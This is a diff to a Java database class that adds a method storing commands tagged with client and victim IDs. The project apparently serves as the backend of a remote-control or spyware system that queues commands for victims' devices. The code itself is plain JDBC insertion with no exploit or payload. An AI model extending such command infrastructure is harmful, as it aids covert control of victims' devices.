@@ -1,8 +1,8 @@
-package com.theah64.xrob.api.database.tables;
+package com.theah64.xrob.api.database.tables.command;
 
 import com.theah64.xrob.api.database.Connection;
+import com.theah64.xrob.api.database.tables.BaseTable;
 import com.theah64.xrob.api.models.Command;
-import com.theah64.xrob.api.models.Contact;
 
 import java.sql.PreparedStatement;
 import java.sql.ResultSet;
@@ -57,7 +57,7 @@ public class Commands extends BaseTable<Command> {
                         commandStatuses.add(new Command.Status(commandStatusesArr[i], commandStatusMessages[i], Long.parseLong(commandStatusesReportedAt[i])));
                     }
 
-                    commands.add(new Command(id, command, commandEstablishedAt, commandStatuses));
+                    commands.add(new Command(id, command, commandEstablishedAt, commandStatuses, null, null));
 
                 } while (rs.next());
             }
@@ -72,5 +72,43 @@ public class Commands extends BaseTable<Command> {
             }
         }
         return commands;
+    }
+
+    @Override
+    public String addv3(Command command) {
+        String commandId = null;
+        final String addClientQuery = "INSERT INTO commands (command,client_id,victim_id) VALUES (?,?,?);";
+        final java.sql.Connection connection = Connection.getConnection();
+
+        //To track the success
+        try {
+            final PreparedStatement ps = connection.prepareStatement(addClientQuery, PreparedStatement.RETURN_GENERATED_KEYS);
+
+            ps.setString(1, command.getCommand());
+            ps.setString(2, command.getClientId());
+            ps.setString(3, command.getVictimId());
+
+            if (ps.executeUpdate() == 1) {
+                final ResultSet rs = ps.getGeneratedKeys();
+                if (rs.first()) {
+                    commandId = rs.getString(1);
+                }
+                rs.close();
+            }
+
+
+            ps.close();
+
+        } catch (SQLException e) {
+            e.printStackTrace();
+        } finally {
+            try {
+                connection.close();
+            } catch (SQLException e) {
+                e.printStackTrace();
+            }
+        }
+
+        return commandId;
     }
 }
